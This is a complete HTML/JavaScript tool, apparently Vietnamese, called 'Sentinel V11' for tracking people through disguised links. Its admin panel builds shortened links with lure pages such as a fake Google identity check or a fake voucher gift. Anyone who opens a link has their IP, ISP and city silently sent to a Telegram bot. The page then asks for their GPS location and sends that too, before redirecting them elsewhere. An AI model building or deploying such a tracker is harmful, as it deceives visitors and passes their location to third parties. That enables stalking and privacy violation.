<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title id="meta-title">ƒêang x√°c th·ª±c...</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .admin-bg { background: #02040a; }
        .glass { background: rgba(13, 17, 23, 0.95); border: 1px solid #30363d; }
        .input-alt { background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; font-size: 12px; }
        .input-alt:focus { border-color: #58a6ff; outline: none; }
        .btn-blue { background: #238636; color: white; font-weight: bold; transition: 0.2s; }
        .btn-blue:hover { background: #2ea043; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 10px; }
    </style>
</head>
<body class="admin-bg text-slate-400 font-sans min-h-screen">

    <div id="v-track" class="flex flex-col items-center justify-center h-screen p-6 text-center transition-all duration-700">
        <div id="ui-content" class="animate-in fade-in duration-1000">
            </div>
    </div>

    <div id="v-admin" class="hidden p-4 lg:p-8">
        <div class="max-w-7xl mx-auto space-y-6">
            <header class="flex justify-between items-center border-b border-slate-800 pb-4">
                <h1 class="text-xl font-black text-white italic tracking-tighter uppercase">Sentinel <span class="text-blue-500">V11</span></h1>
                <div class="flex gap-4">
                    <button onclick="clearLogs()" class="text-[9px] text-slate-500 uppercase hover:text-red-500">X√≥a nh·∫≠t k√Ω</button>
                    <button onclick="logout()" class="text-[9px] bg-red-900/20 text-red-500 px-3 py-1 rounded border border-red-900/30">LOGOUT</button>
                </div>
            </header>

            <div class="grid lg:grid-cols-12 gap-6">
                <div class="lg:col-span-5 space-y-4">
                    <div class="glass p-6 rounded-2xl space-y-4 shadow-2xl">
                        <h3 class="text-blue-500 text-[10px] font-black uppercase tracking-widest">1. C·∫•u h√¨nh ƒë√≠ch ƒë·∫øn & Telegram</h3>
                        <div class="grid grid-cols-2 gap-3">
                            <input id="in-tk" type="password" placeholder="Bot Token" class="w-full input-alt p-3 rounded-xl">
                            <input id="in-id" type="text" placeholder="Chat ID" class="w-full input-alt p-3 rounded-xl">
                        </div>
                        <input id="in-redir" type="text" placeholder="Link ƒë√≠ch ƒë·∫øn sau khi l·∫•y IP (VD: facebook.com/abc)" class="w-full input-alt p-3 rounded-xl">
                        <div class="flex gap-2">
                            <input id="in-api" type="password" placeholder="Cutt.ly Key" class="flex-1 input-alt p-3 rounded-xl">
                            <button onclick="checkAPI()" class="bg-slate-800 px-4 rounded-xl text-[9px] font-bold">CHECK</button>
                        </div>
                        <button onclick="saveC()" class="w-full btn-blue py-3 rounded-xl text-[10px] uppercase tracking-widest">L∆∞u h·ªá th·ªëng</button>
                    </div>

                    <div class="glass p-6 rounded-2xl space-y-4 shadow-2xl">
                        <h3 class="text-purple-500 text-[10px] font-black uppercase tracking-widest">2. T√πy ch·ªçn Template B·∫´y</h3>
                        <select id="ed-temp" onchange="updatePreview()" class="w-full input-alt p-3 rounded-xl text-xs uppercase font-bold">
                            <option value="verify">X√°c th·ª±c Google (B·∫£n chu·∫©n)</option>
                            <option value="gift">Nh·∫≠n qu√† t·∫∑ng / Voucher</option>
                            <option value="error">L·ªói h·ªá th·ªëng 404</option>
                            <option value="blank">Tr·∫Øng (T·ªëi gi·∫£n c·ª±c ƒë·ªô)</option>
                        </select>
                        <input id="in-name" type="text" placeholder="T√™n n·∫°n nh√¢n (Ghi ch√∫)..." class="w-full input-alt p-3 rounded-xl text-xs">
                        <button onclick="generateLink()" class="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3 rounded-xl text-[10px] uppercase transition-all">Build Link Phantom</button>
                        <div id="out-link" onclick="copyL(this)" class="hidden p-4 bg-black rounded-xl border border-blue-900/50 text-[10px] text-blue-400 break-all cursor-pointer font-mono text-center shadow-inner"></div>
                    </div>
                </div>

                <div class="lg:col-span-7">
                    <div class="glass rounded-2xl overflow-hidden min-h-[520px] flex flex-col shadow-2xl">
                        <div class="p-4 bg-slate-900/50 border-b border-slate-800 flex justify-between">
                            <span class="text-[10px] font-black text-slate-500 tracking-widest uppercase italic">Operational Logs</span>
                            <span class="text-[8px] text-green-500 animate-pulse">‚óè System Live</span>
                        </div>
                        <div class="overflow-x-auto flex-1">
                            <table class="w-full text-left text-[11px]">
                                <thead class="bg-slate-950/80 text-slate-500 uppercase text-[8px]">
                                    <tr>
                                        <th class="p-4">Target</th>
                                        <th class="p-4">IP/ISP</th>
                                        <th class="p-4">V·ªã tr√≠ (City)</th>
                                        <th class="p-4 text-right">H√†nh ƒë·ªông</th>
                                    </tr>
                                </thead>
                                <tbody id="log-table" class="divide-y divide-slate-800/30"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // C·∫•u h√¨nh ban ƒë·∫ßu
        let cfg = { 
            t: "", 
            i: "", a: "", 
            r: "https://vi.wikipedia.org/wiki/ƒê√†o_Minh_Qu√¢n",
            temp: "verify"
        };

        const params = new URLSearchParams(window.location.search);

        // C√°c k·ªãch b·∫£n b·∫´y (Templates)
        const templates = {
            verify: {
                title: "X√°c minh Google",
                html: `<div class="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-6 mx-auto"></div>
                       <h2 class="text-white text-lg font-bold">X√ÅC MINH DANH T√çNH</h2>
                       <p class="text-xs text-slate-500 mt-2">Vui l√≤ng nh·∫•n 'Cho ph√©p' tr√™n tr√¨nh duy·ªát ƒë·ªÉ ti·∫øp t·ª•c.</p>`
            },
            gift: {
                title: "Qu√† t·∫∑ng tri √¢n",
                html: `<div class="text-5xl mb-4">üéÅ</div>
                       <h2 class="text-yellow-500 text-lg font-black uppercase">Ch√∫c m·ª´ng b·∫°n!</h2>
                       <p class="text-xs text-slate-400 mt-2">Vui l√≤ng x√°c th·ª±c v·ªã tr√≠ ƒë·ªÉ nh·∫≠n m√£ gi·∫£m gi√° 500k.</p>`
            },
            error: {
                title: "L·ªói h·ªá th·ªëng 404",
                html: `<h1 class="text-6xl font-black text-slate-800">404</h1>
                       <h2 class="text-slate-500 text-sm mt-4 italic">ƒê∆∞·ªùng d·∫´n n√†y kh√¥ng c√≤n t·ªìn t·∫°i.<br>ƒêang quay tr·ªü l·∫°i trang ch·ªß...</h2>`
            },
            blank: {
                title: "Loading...",
                html: `<div class="w-4 h-4 bg-slate-800 rounded-full animate-ping mx-auto"></div>`
            }
        };

        window.onload = () => {
            if (params.has('admin')) {
                if (localStorage.getItem('auth_v11') === 'true' || prompt("Pass:") === "123") {
                    localStorage.setItem('auth_v11', 'true');
                    document.getElementById('v-track').remove();
                    document.getElementById('v-admin').classList.remove('hidden');
                    loadAdmin();
                } else { window.location.search = ""; }
            } else { applyTemplate(); executeTracking(); }
        };

        function applyTemplate() {
            try { const v = params.get('v'); if(v) cfg = JSON.parse(atob(v)); } catch(e) {}
            const t = templates[cfg.temp] || templates.verify;
            document.getElementById('ui-content').innerHTML = t.html;
            document.getElementById('meta-title').innerText = t.title;
        }

        async function executeTracking() {
            const name = params.get('name') || 'Guest';
            
            // 1. Silent IP Tracking
            try {
                const res = await fetch('https://ipapi.co/json/').then(r => r.json());
                const log = { name, ip: res.ip, isp: res.org, city: res.city, time: new Date().toLocaleTimeString(), st: 'IP-ONLY' };
                saveLog(log);
                
                const msg = `üöÄ <b>${name.toUpperCase()} TRUY C·∫¨P</b>\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\nüåê IP: <code>${res.ip}</code>\nüè¢ ISP: ${res.org}\nüìç V√πng: ${res.city}, ${res.country_name}`;
                await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent(msg)}`);
            } catch(e) {}

            const finish = () => location.replace(cfg.r);

            // 2. GPS Tracking
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    updateLogStatus(name, 'GPS-OK', lat, lon);
                    const gpsMsg = `üéØ <b>GPS OK: ${name}</b>\nüìç Map: <a href="https://www.google.com/maps?q=${lat},${lon}">XEM V·ªä TR√ç</a>`;
                    await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent(gpsMsg)}`);
                    finish();
                }, finish, {enableHighAccuracy: true, timeout: 5000});
            } else { finish(); }
            setTimeout(finish, 8000);
        }

        // --- ADMIN DASHBOARD ---
        function loadAdmin() {
            const saved = localStorage.getItem('cfg_v11');
            if(saved) cfg = JSON.parse(saved);
            document.getElementById('in-tk').value = cfg.t;
            document.getElementById('in-id').value = cfg.i;
            document.getElementById('in-redir').value = cfg.r;
            document.getElementById('in-api').value = cfg.a || "";
            document.getElementById('ed-temp').value = cfg.temp;
            renderLogs();
        }

        function saveC() {
            cfg.t = document.getElementById('in-tk').value;
            cfg.i = document.getElementById('in-id').value;
            cfg.r = document.getElementById('in-redir').value;
            cfg.a = document.getElementById('in-api').value;
            cfg.temp = document.getElementById('ed-temp').value;
            localStorage.setItem('cfg_v11', JSON.stringify(cfg));
            alert("C·∫•u h√¨nh h·ªá th·ªëng ƒë√£ ƒë∆∞·ª£c c·∫≠p nh·∫≠t!");
        }

        async function generateLink() {
            const name = document.getElementById('in-name').value || "Target";
            const base = window.location.href.split('?')[0];
            let link = `${base}?name=${encodeURIComponent(name)}&v=${btoa(JSON.stringify(cfg))}`;
            
            if(cfg.a) {
                const r = await fetch(`https://cutt.ly/api/api.php?key=${cfg.a}&short=${encodeURIComponent(link)}`).then(res => res.json());
                if(r.url.status === 7) link = r.url.shortLink;
            }
            
            const out = document.getElementById('out-link');
            out.innerText = link; out.classList.remove('hidden');
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('sentinel_logs_v11') || '[]');
            const table = document.getElementById('log-table');
            table.innerHTML = logs.map(l => `
                <tr class="hover:bg-slate-800/30 border-b border-slate-800/50">
                    <td class="p-4"><b class="text-white uppercase">${l.name}</b><br><span class="text-[9px] text-slate-600">${l.time}</span></td>
                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-slate-600 text-[9px]">${l.isp}</span></td>
                    <td class="p-4 text-[10px]">${l.city || 'N/A'}</td>
                    <td class="p-4 text-right">
                        <div class="flex flex-col gap-1 items-end">
                            <span class="text-[8px] font-black italic ${l.st==='GPS-OK'?'text-green-500':'text-yellow-600'}">${l.st}</span>
                            <div class="flex gap-2">
                                <a href="https://www.google.com/maps?q=${l.lat},${l.lon}" target="_blank" class="text-[9px] text-blue-500 underline">MAP</a>
                                <a href="https://whois.com/whois/${l.ip}" target="_blank" class="text-[9px] text-purple-500 underline">WHOIS</a>
                            </div>
                        </div>
                    </td>
                </tr>`).join('');
        }

        function saveLog(d) {
            let logs = JSON.parse(localStorage.getItem('sentinel_logs_v11') || '[]');
            logs.unshift(d);
            localStorage.setItem('sentinel_logs_v11', JSON.stringify(logs.slice(0, 100)));
            if(!document.getElementById('v-admin').classList.contains('hidden')) renderLogs();
        }

        function updateLogStatus(n, st, lat, lon) {
            let logs = JSON.parse(localStorage.getItem('sentinel_logs_v11') || '[]');
            if(logs[0] && logs[0].name === n) { logs[0].st = st; logs[0].lat = lat; logs[0].lon = lon; }
            localStorage.setItem('sentinel_logs_v11', JSON.stringify(logs));
        }

        function clearLogs() { localStorage.removeItem('sentinel_logs_v11'); renderLogs(); }
        async function checkAPI() {
            const res = await fetch(`https://cutt.ly/api/api.php?key=${document.getElementById('in-api').value}&short=https://google.com`).then(r => r.json());
            alert(res.url.status === 7 ? "API Key OK!" : "API Key L·ªói!");
        }
        function copyL(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ sao ch√©p link!"); }
        function logout() { localStorage.removeItem('auth_v11'); location.reload(); }
    </script>
</body>
</html>
